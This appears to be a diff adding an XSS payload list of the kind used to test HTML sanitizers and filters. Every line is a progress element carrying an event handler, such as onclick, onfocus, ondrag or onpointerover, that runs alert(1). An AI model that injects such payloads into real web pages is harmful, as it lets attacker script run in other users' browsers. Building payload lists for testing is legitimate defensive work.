@@ -1,0 +1,38 @@
+<progress contenteditable onbeforeinput=alert(1)>test
+<progress draggable="true" ondrag="alert(1)" style=display:block>test</progress>
+<progress draggable="true" ondragend="alert(1)" style=display:block>test</progress>
+<progress draggable="true" ondragenter="alert(1)" style=display:block>test</progress>
+<progress draggable="true" ondragleave="alert(1)" style=display:block>test</progress>
+<progress draggable="true" ondragstart="alert(1)" style=display:block>test</progress>
+<progress id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></progress>
+<progress id=x tabindex=1 onfocus=alert(1)></progress>
+<progress id=x tabindex=1 onfocusin=alert(1)></progress>
+<progress onafterscriptexecute=alert(1)><script>1</script>
+<progress onbeforescriptexecute=alert(1)><script>1</script>
+<progress onblur=alert(1) id=x tabindex=1 style=display:block>test</progress><input value=clickme>
+<progress onclick="alert(1)" style=display:block>test</progress>
+<progress oncontextmenu="alert(1)" style=display:block>test</progress>
+<progress oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<progress oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<progress ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</progress>
+<progress onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</progress><input value=clickme>
+<progress onkeydown="alert(1)" contenteditable style=display:block>test</progress>
+<progress onkeypress="alert(1)" contenteditable style=display:block>test</progress>
+<progress onkeyup="alert(1)" contenteditable style=display:block>test</progress>
+<progress onmousedown="alert(1)" style=display:block>test</progress>
+<progress onmouseenter="alert(1)" style=display:block>test</progress>
+<progress onmouseleave="alert(1)" style=display:block>test</progress>
+<progress onmousemove="alert(1)" style=display:block>test</progress>
+<progress onmouseout="alert(1)" style=display:block>test</progress>
+<progress onmouseover="alert(1)" style=display:block>test</progress>
+<progress onmouseup="alert(1)" style=display:block>test</progress>
+<progress onmousewheel=alert(1) style=display:block>requires scrolling
+<progress onpointerdown=alert(1) style=display:block>XSS</progress>
+<progress onpointerenter=alert(1) style=display:block>XSS</progress>
+<progress onpointerleave=alert(1) style=display:block>XSS</progress>
+<progress onpointermove=alert(1) style=display:block>XSS</progress>
+<progress onpointerout=alert(1) style=display:block>XSS</progress>
+<progress onpointerover=alert(1) style=display:block>XSS</progress>
+<progress onpointerrawupdate=alert(1) style=display:block>XSS</progress>
+<progress onpointerup=alert(1) style=display:block>XSS</progress>
+<progress onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></progress>
